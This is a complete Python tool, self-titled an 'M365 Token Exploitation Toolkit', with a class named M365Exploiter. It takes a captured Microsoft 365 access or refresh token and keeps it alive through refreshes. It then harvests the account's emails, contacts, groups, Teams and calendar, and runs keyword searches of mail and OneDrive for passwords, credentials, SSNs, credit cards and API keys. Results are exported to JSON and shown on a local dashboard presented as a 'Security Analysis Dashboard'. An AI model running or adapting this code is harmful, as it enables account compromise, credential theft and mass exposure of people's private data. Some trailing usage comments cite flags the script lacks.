#!/usr/bin/env python3
"""
M365 Token Exploitation Toolkit v3.0 - PROFESSIONAL WEB EDITION
- Enhanced token validation & rotation
- Embedded HTML web interface
- Real-time monitoring dashboard
- Comprehensive logging
- Async operations support
"""
import requests
import json
import base64
import time
import threading
import logging
import sys
import os
import webbrowser
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
from typing import Optional, Dict, Any, List, Tuple
from datetime import datetime, timedelta
from dataclasses import dataclass
from enum import Enum

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('m365_exploit.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# Configuration
class Config:
    CLIENT_ID = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
    BASE_URL = "https://graph.microsoft.com/v1.0"
    TOKEN_URL = "https://login.microsoftonline.com/common/oauth2/v2.0/token"
    MAX_RETRIES = 3
    RETRY_DELAY = 2
    REQUEST_TIMEOUT = 30
    RATE_LIMIT_WAIT = 60
    MAX_PAGE_SIZE = 999
    WEB_PORT = 8888

class TokenStatus(Enum):
    VALID = "valid"
    EXPIRED = "expired"
    INVALID = "invalid"
    REFRESHED = "refreshed"

@dataclass
class TokenInfo:
    access_token: str
    refresh_token: Optional[str]
    expires_at: datetime
    token_type: str
    scope: List[str]
    
    @property
    def is_expired(self) -> bool:
        return datetime.now() >= self.expires_at
    
    @property
    def time_remaining(self) -> timedelta:
        return self.expires_at - datetime.now()

class TokenManager:
    """Manages token lifecycle with automatic refresh"""
    
    def __init__(self, access_token: str, refresh_token: Optional[str] = None):
        self.access_token = access_token
        self.refresh_token = refresh_token
        self.token_info: Optional[TokenInfo] = None
        self._lock = threading.Lock()
        self._validate_and_parse_token()
    
    def _validate_and_parse_token(self) -> bool:
        """Parse and validate JWT token structure"""
        try:
            parts = self.access_token.split('.')
            if len(parts) != 3:
                logger.error("Invalid token format: expected 3 parts")
                return False
            
            payload_b64 = parts[1]
            padding = 4 - (len(payload_b64) % 4)
            if padding != 4:
                payload_b64 += '=' * padding
            
            payload = json.loads(base64.urlsafe_b64decode(payload_b64).decode())
            
            expires_at = datetime.fromtimestamp(payload.get('exp', 0))
            scope = payload.get('scp', '').split() if 'scp' in payload else []
            if not scope and 'roles' in payload:
                scope = payload.get('roles', [])
            
            self.token_info = TokenInfo(
                access_token=self.access_token,
                refresh_token=self.refresh_token,
                expires_at=expires_at,
                token_type=payload.get('token_type', 'Bearer'),
                scope=scope
            )
            
            logger.info(f"Token parsed successfully. Expires: {expires_at}")
            return True
            
        except Exception as e:
            logger.error(f"Token validation failed: {e}")
            return False
    
    def get_valid_token(self) -> Optional[str]:
        """Get a valid token, refreshing if necessary"""
        with self._lock:
            if not self.token_info:
                if not self._validate_and_parse_token():
                    return None
            
            if self.token_info.is_expired:
                logger.warning("Token expired, attempting refresh")
                if self.refresh_token:
                    if self._refresh_token():
                        logger.info("Token refreshed successfully")
                    else:
                        return None
                else:
                    return None
            
            return self.token_info.access_token
    
    def _refresh_token(self) -> bool:
        """Refresh the access token"""
        if not self.refresh_token:
            return False
        
        data = {
            'client_id': Config.CLIENT_ID,
            'scope': 'openid profile offline_access https://graph.microsoft.com/.default',
            'refresh_token': self.refresh_token,
            'grant_type': 'refresh_token'
        }
        
        try:
            response = requests.post(Config.TOKEN_URL, data=data, timeout=Config.REQUEST_TIMEOUT)
            response.raise_for_status()
            result = response.json()
            
            if 'access_token' in result:
                self.access_token = result['access_token']
                self.refresh_token = result.get('refresh_token', self.refresh_token)
                self._validate_and_parse_token()
                return True
            return False
        except requests.RequestException as e:
            logger.error(f"Token refresh failed: {e}")
            return False

class RateLimiter:
    """Handles Microsoft Graph API rate limiting"""
    
    def __init__(self):
        self.last_request_time = 0
        self.request_count = 0
        self._lock = threading.Lock()
    
    def wait_if_needed(self):
        with self._lock:
            current_time = time.time()
            time_since_last = current_time - self.last_request_time
            
            if time_since_last > 1:
                self.request_count = 0
            
            if self.request_count >= 10:
                sleep_time = 1 - time_since_last
                if sleep_time > 0:
                    time.sleep(sleep_time)
                self.request_count = 0
            
            self.request_count += 1
            self.last_request_time = time.time()

class M365Exploiter:
    """Main exploitation class with comprehensive features"""
    
    def __init__(self, access_token: str, refresh_token: Optional[str] = None):
        self.token_manager = TokenManager(access_token, refresh_token)
        self.rate_limiter = RateLimiter()
        self.session = requests.Session()
        self.session.headers.update({
            'Content-Type': 'application/json',
            'Accept': 'application/json'
        })
        
        # Results storage
        self.results = {
            'user_info': None,
            'sensitive_emails': [],
            'all_emails': [],
            'groups': [],
            'teams': [],
            'files': [],
            'contacts': [],
            'mail_folders': [],
            'calendar_events': []
        }
        self.scan_status = {"status": "idle", "progress": 0, "message": ""}
    
    def _make_request(self, method: str, endpoint: str, data: Optional[Dict] = None, 
                     params: Optional[Dict] = None, retry_count: int = 0) -> Optional[Dict]:
        """Make authenticated API request with retry logic"""
        token = self.token_manager.get_valid_token()
        if not token:
            return None
        
        headers = {'Authorization': f'Bearer {token}'}
        url = endpoint if endpoint.startswith('http') else f"{Config.BASE_URL}/{endpoint.lstrip('/')}"
        
        self.rate_limiter.wait_if_needed()
        
        try:
            response = self.session.request(method=method, url=url, headers=headers, 
                                          json=data, params=params, timeout=Config.REQUEST_TIMEOUT)
            
            if response.status_code == 429:
                retry_after = int(response.headers.get('Retry-After', Config.RATE_LIMIT_WAIT))
                time.sleep(retry_after)
                return self._make_request(method, endpoint, data, params, retry_count)
            
            if response.status_code == 401 and retry_count < Config.MAX_RETRIES:
                time.sleep(Config.RETRY_DELAY)
                return self._make_request(method, endpoint, data, params, retry_count + 1)
            
            response.raise_for_status()
            result = response.json()
            
            if '@odata.nextLink' in result:
                next_result = self._make_request('GET', result['@odata.nextLink'])
                if next_result and 'value' in next_result:
                    if 'value' in result:
                        result['value'].extend(next_result['value'])
                    else:
                        result['value'] = next_result['value']
            
            return result
        except requests.RequestException as e:
            logger.error(f"Request failed: {e}")
            if retry_count < Config.MAX_RETRIES:
                time.sleep(Config.RETRY_DELAY * (2 ** retry_count))
                return self._make_request(method, endpoint, data, params, retry_count + 1)
            return None
    
    def get_user_info(self) -> Optional[Dict]:
        logger.info("Fetching user information...")
        select_fields = ['id', 'displayName', 'mail', 'userPrincipalName', 'jobTitle', 'department']
        result = self._make_request('GET', f"me?$select={','.join(select_fields)}")
        if result:
            self.results['user_info'] = result
        return result
    
    def list_mail_folders(self) -> List[Dict]:
        logger.info("Listing mail folders...")
        result = self._make_request('GET', "me/mailFolders?$select=id,displayName,totalItemCount,unreadItemCount")
        folders = []
        if result and 'value' in result:
            for folder in result['value']:
                folders.append({
                    'id': folder.get('id'),
                    'name': folder.get('displayName'),
                    'total_items': folder.get('totalItemCount', 0),
                    'unread_items': folder.get('unreadItemCount', 0)
                })
        self.results['mail_folders'] = folders
        return folders
    
    def get_all_emails(self, max_results: int = 200) -> List[Dict]:
        logger.info("Retrieving emails...")
        params = {'$top': min(Config.MAX_PAGE_SIZE, max_results), '$orderby': 'receivedDateTime desc'}
        result = self._make_request('GET', "me/messages", params=params)
        
        emails = []
        if result and 'value' in result:
            for msg in result['value']:
                emails.append({
                    'subject': msg.get('subject', '(No subject)'),
                    'from': msg.get('from', {}).get('emailAddress', {}).get('address', 'Unknown'),
                    'received': msg.get('receivedDateTime'),
                    'preview': msg.get('bodyPreview', '')[:200],
                    'has_attachments': msg.get('hasAttachments', False),
                    'id': msg.get('id')
                })
        self.results['all_emails'] = emails
        return emails
    
    def search_sensitive_emails(self) -> List[Dict]:
        logger.info("Searching sensitive emails...")
        keywords = ['password', 'credentials', 'confidential', 'salary', 'ssn', 'credit card', 'api key', 'secret']
        sensitive = []
        
        for keyword in keywords:
            result = self._make_request('GET', f"me/messages?$search=\"subject:{keyword} OR body:{keyword}\"&$top=50")
            if result and 'value' in result:
                for msg in result['value']:
                    sensitive.append({
                        'keyword': keyword,
                        'subject': msg.get('subject', ''),
                        'from': msg.get('from', {}).get('emailAddress', {}).get('address', ''),
                        'received': msg.get('receivedDateTime'),
                        'preview': msg.get('bodyPreview', '')[:150]
                    })
            time.sleep(0.3)
        
        self.results['sensitive_emails'] = sensitive
        return sensitive
    
    def enumerate_groups(self) -> List[Dict]:
        logger.info("Enumerating groups...")
        result = self._make_request('GET', "me/transitiveMemberOf?$select=id,displayName,description")
        groups = []
        if result and 'value' in result:
            for group in result['value']:
                groups.append({
                    'id': group.get('id'),
                    'name': group.get('displayName'),
                    'description': group.get('description', '')
                })
        self.results['groups'] = groups
        return groups
    
    def list_teams(self) -> List[Dict]:
        logger.info("Listing Teams...")
        result = self._make_request('GET', "me/joinedTeams?$select=id,displayName")
        teams = []
        if result and 'value' in result:
            for team in result['value']:
                teams.append({
                    'id': team.get('id'),
                    'name': team.get('displayName')
                })
        self.results['teams'] = teams
        return teams
    
    def search_files(self) -> List[Dict]:
        logger.info("Searching files...")
        keywords = ['password', 'confidential', 'secret', 'credential']
        files = []
        
        for keyword in keywords:
            result = self._make_request('GET', f"me/drive/root/search(q='{keyword}')?$select=name,webUrl,size")
            if result and 'value' in result:
                for file in result['value']:
                    files.append({
                        'keyword': keyword,
                        'name': file.get('name'),
                        'size': file.get('size', 0),
                        'url': file.get('webUrl')
                    })
            time.sleep(0.3)
        
        self.results['files'] = files
        return files
    
    def get_contacts(self) -> List[Dict]:
        logger.info("Retrieving contacts...")
        result = self._make_request('GET', "me/contacts?$select=displayName,emailAddresses,companyName")
        contacts = []
        if result and 'value' in result:
            for contact in result['value']:
                contacts.append({
                    'name': contact.get('displayName'),
                    'email': [e.get('address') for e in contact.get('emailAddresses', []) if e.get('address')],
                    'company': contact.get('companyName')
                })
        self.results['contacts'] = contacts
        return contacts
    
    def get_calendar_events(self, days: int = 14) -> List[Dict]:
        logger.info("Retrieving calendar events...")
        start = datetime.now().isoformat() + 'Z'
        end = (datetime.now() + timedelta(days=days)).isoformat() + 'Z'
        result = self._make_request('GET', f"me/calendar/calendarView?startDateTime={start}&endDateTime={end}")
        
        events = []
        if result and 'value' in result:
            for event in result['value']:
                events.append({
                    'subject': event.get('subject', '(No subject)'),
                    'start': event.get('start', {}).get('dateTime'),
                    'organizer': event.get('organizer', {}).get('emailAddress', {}).get('address')
                })
        self.results['calendar_events'] = events
        return events
    
    def run_full_scan(self):
        """Run complete scan with progress tracking"""
        self.scan_status = {"status": "running", "progress": 0, "message": "Starting scan..."}
        
        steps = [
            (self.get_user_info, "Fetching user info", 10),
            (self.list_mail_folders, "Listing mail folders", 10),
            (self.get_all_emails, "Retrieving emails", 20),
            (self.search_sensitive_emails, "Searching sensitive content", 20),
            (self.enumerate_groups, "Enumerating groups", 10),
            (self.list_teams, "Listing Teams", 10),
            (self.search_files, "Searching files", 10),
            (self.get_contacts, "Retrieving contacts", 5),
            (self.get_calendar_events, "Getting calendar events", 5)
        ]
        
        for i, (func, msg, progress) in enumerate(steps):
            self.scan_status["message"] = msg
            try:
                func()
            except Exception as e:
                logger.error(f"Error in {msg}: {e}")
            self.scan_status["progress"] = min(100, self.scan_status["progress"] + progress)
        
        self.scan_status = {"status": "completed", "progress": 100, "message": "Scan completed successfully"}

# Global exploiter instance
exploiter = None

class WebHandler(BaseHTTPRequestHandler):
    """HTTP request handler for web interface"""
    
    def do_GET(self):
        parsed = urlparse(self.path)
        
        if parsed.path == '/':
            self.serve_html()
        elif parsed.path == '/api/status':
            self.serve_json(self.get_status())
        elif parsed.path == '/api/results':
            self.serve_json(self.get_results())
        elif parsed.path == '/api/scan':
            self.start_scan()
        elif parsed.path == '/api/export':
            self.export_results()
        else:
            self.send_response(404)
            self.end_headers()
    
    def do_POST(self):
        if self.path == '/api/scan':
            self.start_scan()
        else:
            self.send_response(404)
            self.end_headers()
    
    def serve_html(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(HTML_TEMPLATE.encode())
    
    def serve_json(self, data):
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.end_headers()
        self.wfile.write(json.dumps(data).encode())
    
    def get_status(self):
        if exploiter:
            return {
                'status': exploiter.scan_status['status'],
                'progress': exploiter.scan_status['progress'],
                'message': exploiter.scan_status['message']
            }
        return {'status': 'not_initialized', 'progress': 0, 'message': 'No token configured'}
    
    def get_results(self):
        if exploiter:
            return {
                'user': exploiter.results['user_info'],
                'stats': {
                    'emails': len(exploiter.results['all_emails']),
                    'sensitive': len(exploiter.results['sensitive_emails']),
                    'groups': len(exploiter.results['groups']),
                    'teams': len(exploiter.results['teams']),
                    'files': len(exploiter.results['files']),
                    'contacts': len(exploiter.results['contacts']),
                    'folders': len(exploiter.results['mail_folders']),
                    'calendar': len(exploiter.results['calendar_events'])
                },
                'sensitive_emails': exploiter.results['sensitive_emails'][:20],
                'groups': exploiter.results['groups'][:10],
                'files': exploiter.results['files'][:10],
                'contacts': exploiter.results['contacts'][:10]
            }
        return {'error': 'No data available'}
    
    def start_scan(self):
        if exploiter and exploiter.scan_status['status'] != 'running':
            thread = threading.Thread(target=exploiter.run_full_scan)
            thread.daemon = True
            thread.start()
            self.serve_json({'status': 'started'})
        else:
            self.serve_json({'status': 'already_running'})
    
    def export_results(self):
        if exploiter:
            filename = f"m365_export_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
            with open(filename, 'w') as f:
                json.dump(exploiter.results, f, indent=2, default=str)
            self.serve_json({'status': 'exported', 'filename': filename})
        else:
            self.serve_json({'status': 'error'})
    
    def log_message(self, format, *args):
        pass  # Suppress default logging

# HTML Template with embedded CSS and JavaScript
HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>M365 Security Analysis Dashboard</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        
        .container {
            max-width: 1400px;
            margin: 0 auto;
        }
        
        .header {
            background: white;
            border-radius: 15px;
            padding: 30px;
            margin-bottom: 20px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.1);
        }
        
        .header h1 {
            color: #667eea;
            font-size: 28px;
            margin-bottom: 10px;
        }
        
        .header p {
            color: #666;
            font-size: 14px;
        }
        
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            margin-bottom: 20px;
        }
        
        .stat-card {
            background: white;
            border-radius: 15px;
            padding: 20px;
            text-align: center;
            box-shadow: 0 5px 20px rgba(0,0,0,0.1);
            transition: transform 0.3s;
        }
        
        .stat-card:hover {
            transform: translateY(-5px);
        }
        
        .stat-number {
            font-size: 36px;
            font-weight: bold;
            color: #667eea;
        }
        
        .stat-label {
            color: #666;
            font-size: 14px;
            margin-top: 10px;
        }
        
        .scan-panel {
            background: white;
            border-radius: 15px;
            padding: 30px;
            margin-bottom: 20px;
            box-shadow: 0 5px 20px rgba(0,0,0,0.1);
        }
        
        .progress-bar {
            width: 100%;
            height: 30px;
            background: #e0e0e0;
            border-radius: 15px;
            overflow: hidden;
            margin: 20px 0;
        }
        
        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #667eea, #764ba2);
            transition: width 0.5s;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-size: 12px;
            font-weight: bold;
        }
        
        .btn {
            background: linear-gradient(135deg, #667eea, #764ba2);
            color: white;
            border: none;
            padding: 12px 30px;
            border-radius: 25px;
            cursor: pointer;
            font-size: 16px;
            font-weight: bold;
            transition: transform 0.3s;
        }
        
        .btn:hover {
            transform: scale(1.05);
        }
        
        .btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }
        
        .results-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(500px, 1fr));
            gap: 20px;
        }
        
        .result-card {
            background: white;
            border-radius: 15px;
            padding: 20px;
            box-shadow: 0 5px 20px rgba(0,0,0,0.1);
        }
        
        .result-card h3 {
            color: #667eea;
            margin-bottom: 15px;
            font-size: 18px;
            border-bottom: 2px solid #f0f0f0;
            padding-bottom: 10px;
        }
        
        .result-item {
            padding: 10px;
            border-bottom: 1px solid #f0f0f0;
            cursor: pointer;
            transition: background 0.3s;
        }
        
        .result-item:hover {
            background: #f8f9ff;
        }
        
        .result-title {
            font-weight: bold;
            color: #333;
            margin-bottom: 5px;
        }
        
        .result-subtitle {
            font-size: 12px;
            color: #999;
        }
        
        .badge {
            display: inline-block;
            padding: 2px 8px;
            border-radius: 12px;
            font-size: 11px;
            font-weight: bold;
            margin-left: 10px;
        }
        
        .badge-danger {
            background: #fee;
            color: #c00;
        }
        
        .badge-warning {
            background: #fef;
            color: #f90;
        }
        
        .badge-success {
            background: #efe;
            color: #090;
        }
        
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.5);
            z-index: 1000;
            justify-content: center;
            align-items: center;
        }
        
        .modal-content {
            background: white;
            border-radius: 15px;
            padding: 30px;
            max-width: 600px;
            max-height: 80%;
            overflow-y: auto;
        }
        
        .status-message {
            margin-top: 15px;
            padding: 10px;
            border-radius: 10px;
            background: #f8f9ff;
            color: #667eea;
            text-align: center;
        }
        
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }
        
        .loading {
            animation: pulse 1.5s infinite;
        }
        
        .user-info {
            background: linear-gradient(135deg, #667eea, #764ba2);
            color: white;
            padding: 20px;
            border-radius: 15px;
            margin-bottom: 20px;
        }
        
        .user-name {
            font-size: 24px;
            font-weight: bold;
        }
        
        .user-email {
            font-size: 14px;
            opacity: 0.9;
            margin-top: 5px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔐 M365 Security Analysis Dashboard</h1>
            <p>Comprehensive Microsoft 365 tenant security assessment and monitoring tool</p>
        </div>
        
        <div id="userInfo" class="user-info" style="display: none;"></div>
        
        <div class="stats-grid" id="statsGrid"></div>
        
        <div class="scan-panel">
            <h3>🔄 Security Scan Controller</h3>
            <div class="progress-bar">
                <div class="progress-fill" id="progressFill" style="width: 0%">0%</div>
            </div>
            <button class="btn" id="scanBtn" onclick="startScan()">🚀 Start Full Security Scan</button>
            <button class="btn" id="exportBtn" onclick="exportResults()" style="margin-left: 10px; background: linear-gradient(135deg, #28a745, #20c997);">📥 Export Results</button>
            <div id="statusMessage" class="status-message" style="display: none;"></div>
        </div>
        
        <div class="results-grid">
            <div class="result-card">
                <h3>⚠️ Sensitive Emails <span id="sensitiveCount" class="badge badge-danger"></span></h3>
                <div id="sensitiveEmails"></div>
            </div>
            
            <div class="result-card">
                <h3>👥 Security Groups</h3>
                <div id="groups"></div>
            </div>
            
            <div class="result-card">
                <h3>📁 Sensitive Files</h3>
                <div id="files"></div>
            </div>
            
            <div class="result-card">
                <h3>📇 Contacts</h3>
                <div id="contacts"></div>
            </div>
        </div>
    </div>
    
    <div id="modal" class="modal" onclick="closeModal()">
        <div class="modal-content" onclick="event.stopPropagation()">
            <h3 id="modalTitle"></h3>
            <pre id="modalContent" style="margin-top: 15px; white-space: pre-wrap; word-wrap: break-word;"></pre>
            <button class="btn" onclick="closeModal()" style="margin-top: 15px;">Close</button>
        </div>
    </div>
    
    <script>
        let updateInterval = null;
        
        function startScan() {
            fetch('/api/scan', { method: 'POST' })
                .then(res => res.json())
                .then(data => {
                    if (data.status === 'started') {
                        document.getElementById('scanBtn').disabled = true;
                        if (updateInterval) clearInterval(updateInterval);
                        updateInterval = setInterval(updateStatus, 1000);
                    }
                });
        }
        
        function updateStatus() {
            fetch('/api/status')
                .then(res => res.json())
                .then(data => {
                    const progress = data.progress || 0;
                    const fill = document.getElementById('progressFill');
                    fill.style.width = progress + '%';
                    fill.textContent = progress + '%';
                    
                    const statusMsg = document.getElementById('statusMessage');
                    if (data.status === 'running') {
                        statusMsg.style.display = 'block';
                        statusMsg.innerHTML = '🔄 ' + data.message;
                        statusMsg.style.background = '#fff3cd';
                        statusMsg.style.color = '#856404';
                    } else if (data.status === 'completed') {
                        statusMsg.style.display = 'block';
                        statusMsg.innerHTML = '✅ ' + data.message;
                        statusMsg.style.background = '#d4edda';
                        statusMsg.style.color = '#155724';
                        document.getElementById('scanBtn').disabled = false;
                        clearInterval(updateInterval);
                        loadResults();
                    }
                });
        }
        
        function loadResults() {
            fetch('/api/results')
                .then(res => res.json())
                .then(data => {
                    if (data.user) {
                        const userDiv = document.getElementById('userInfo');
                        userDiv.style.display = 'block';
                        userDiv.innerHTML = `
                            <div class="user-name">👤 ${data.user.displayName || 'N/A'}</div>
                            <div class="user-email">📧 ${data.user.mail || data.user.userPrincipalName || 'N/A'}</div>
                            <div style="font-size: 12px; margin-top: 10px;">🏢 ${data.user.jobTitle || 'No title'} ${data.user.department ? '· ' + data.user.department : ''}</div>
                        `;
                    }
                    
                    if (data.stats) {
                        const stats = data.stats;
                        document.getElementById('statsGrid').innerHTML = `
                            <div class="stat-card"><div class="stat-number">${stats.emails}</div><div class="stat-label">Total Emails</div></div>
                            <div class="stat-card"><div class="stat-number">${stats.sensitive}</div><div class="stat-label">Sensitive Emails</div></div>
                            <div class="stat-card"><div class="stat-number">${stats.groups}</div><div class="stat-label">Security Groups</div></div>
                            <div class="stat-card"><div class="stat-number">${stats.teams}</div><div class="stat-label">Teams</div></div>
                            <div class="stat-card"><div class="stat-number">${stats.files}</div><div class="stat-label">Sensitive Files</div></div>
                            <div class="stat-card"><div class="stat-number">${stats.contacts}</div><div class="stat-label">Contacts</div></div>
                        `;
                        document.getElementById('sensitiveCount').textContent = stats.sensitive;
                    }
                    
                    if (data.sensitive_emails) {
                        const container = document.getElementById('sensitiveEmails');
                        container.innerHTML = data.sensitive_emails.map(email => `
                            <div class="result-item" onclick="showDetails('Email Details', ${JSON.stringify(email).replace(/"/g, '&quot;')})">
                                <div class="result-title">🔍 ${escapeHtml(email.keyword)}: ${escapeHtml(email.subject.substring(0, 80))}</div>
                                <div class="result-subtitle">📧 ${escapeHtml(email.from)} · 📅 ${new Date(email.received).toLocaleDateString()}</div>
                            </div>
                        `).join('');
                        if (data.sensitive_emails.length === 0) container.innerHTML = '<div style="padding: 20px; text-align: center; color: #999;">No sensitive emails found</div>';
                    }
                    
                    if (data.groups) {
                        const container = document.getElementById('groups');
                        container.innerHTML = data.groups.map(group => `
                            <div class="result-item" onclick="showDetails('Group Details', ${JSON.stringify(group).replace(/"/g, '&quot;')})">
                                <div class="result-title">👥 ${escapeHtml(group.name)}</div>
                                <div class="result-subtitle">🆔 ${escapeHtml(group.id)}</div>
                            </div>
                        `).join('');
                        if (data.groups.length === 0) container.innerHTML = '<div style="padding: 20px; text-align: center; color: #999;">No groups found</div>';
                    }
                    
                    if (data.files) {
                        const container = document.getElementById('files');
                        container.innerHTML = data.files.map(file => `
                            <div class="result-item" onclick="showDetails('File Details', ${JSON.stringify(file).replace(/"/g, '&quot;')})">
                                <div class="result-title">📄 ${escapeHtml(file.name)}</div>
                                <div class="result-subtitle">🔍 ${escapeHtml(file.keyword)} · ${(file.size / 1024).toFixed(1)} KB</div>
                            </div>
                        `).join('');
                        if (data.files.length === 0) container.innerHTML = '<div style="padding: 20px; text-align: center; color: #999;">No sensitive files found</div>';
                    }
                    
                    if (data.contacts) {
                        const container = document.getElementById('contacts');
                        container.innerHTML = data.contacts.map(contact => `
                            <div class="result-item" onclick="showDetails('Contact Details', ${JSON.stringify(contact).replace(/"/g, '&quot;')})">
                                <div class="result-title">📇 ${escapeHtml(contact.name)}</div>
                                <div class="result-subtitle">📧 ${escapeHtml(contact.email[0] || 'No email')} · 🏢 ${escapeHtml(contact.company || 'No company')}</div>
                            </div>
                        `).join('');
                        if (data.contacts.length === 0) container.innerHTML = '<div style="padding: 20px; text-align: center; color: #999;">No contacts found</div>';
                    }
                });
        }
        
        function showDetails(title, content) {
            document.getElementById('modalTitle').textContent = title;
            document.getElementById('modalContent').textContent = JSON.stringify(content, null, 2);
            document.getElementById('modal').style.display = 'flex';
        }
        
        function closeModal() {
            document.getElementById('modal').style.display = 'none';
        }
        
        function exportResults() {
            fetch('/api/export')
                .then(res => res.json())
                .then(data => {
                    if (data.status === 'exported') {
                        alert('Results exported to: ' + data.filename);
                    }
                });
        }
        
        function escapeHtml(text) {
            if (!text) return '';
            const div = document.createElement('div');
            div.textContent = text;
            return div.innerHTML;
        }
        
        // Auto-refresh results every 5 seconds when not scanning
        setInterval(() => {
            fetch('/api/status')
                .then(res => res.json())
                .then(data => {
                    if (data.status !== 'running') {
                        loadResults();
                    }
                });
        }, 5000);
        
        // Initial load
        loadResults();
    </script>
</body>
</html>
'''

def main():
    import argparse
    
    parser = argparse.ArgumentParser(description='M365 Security Analysis Toolkit - Web Edition')
    parser.add_argument('--token-file', type=str, help='JSON file containing tokens')
    parser.add_argument('--access-token', type=str, help='Access token directly')
    parser.add_argument('--refresh-token', type=str, help='Refresh token')
    parser.add_argument('--port', type=int, default=8888, help='Web server port')
    parser.add_argument('--no-browser', action='store_true', help='Don\'t open browser automatically')
    
    args = parser.parse_args()
    
    # Get tokens
    access_token = None
    refresh_token = None
    
    if args.token_file:
        try:
            with open(args.token_file, 'r') as f:
                data = json.load(f)
                access_token = data.get('access_token')
                refresh_token = data.get('refresh_token')
        except Exception as e:
            logger.error(f"Failed to load token file: {e}")
            sys.exit(1)
    elif args.access_token:
        access_token = args.access_token
        refresh_token = args.refresh_token
    else:
        access_token = os.environ.get('M365_ACCESS_TOKEN')
        refresh_token = os.environ.get('M365_REFRESH_TOKEN')
    
    if not access_token:
        print("❌ No access token provided. Use --token-file, --access-token, or M365_ACCESS_TOKEN env var")
        sys.exit(1)
    
    # Initialize exploiter
    global exploiter
    exploiter = M365Exploiter(access_token, refresh_token)
    
    # Start web server
    server = HTTPServer(('', args.port), WebHandler)
    
    print(f"""
╔══════════════════════════════════════════════════════════════╗
║     M365 Security Analysis Dashboard - Web Interface        ║
╠══════════════════════════════════════════════════════════════╣
║  🌐 Web UI: http://localhost:{args.port}                      ║
║  🔐 Token Status: {'✅ Valid' if exploiter.token_manager.token_info else '⚠️ Check token'}
║  📊 Features:                                                ║
║     • Real-time security scan                                ║
║     • Email & file analysis                                  ║
║     • Group & team enumeration                               ║
║     • Sensitive data detection                               ║
║     • Export capabilities                                    ║
╚══════════════════════════════════════════════════════════════╝
    """)
    
    if not args.no_browser:
        webbrowser.open(f'http://localhost:{args.port}')
    
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n\n🛑 Shutting down server...")
        server.shutdown()

if __name__ == "__main__":
    main()

# From token file
#python script.py --token-file tokens.json --output-dir ./results

# Direct token input
#python script.py --access-token "eyJ0eXAi..." --refresh-token "0.A..."

# Environment variables
#export M365_ACCESS_TOKEN="eyJ0eXAi..."
#python script.py --verbose

# Run with token file
#python script.py --token-file tokens.json

# Run with direct token
#python script.py --access-token "eyJ0eXAi..." --refresh-token "0.A..."

# Custom port
#python script.py --token-file tokens.json --port 8080

# Don't auto-open browser
#python script.py --token-file tokens.json --no-browser

# JSON token file format:
{
  "access_token": "eyJ0eXAi...",
  "refresh_token": "0.A..."
}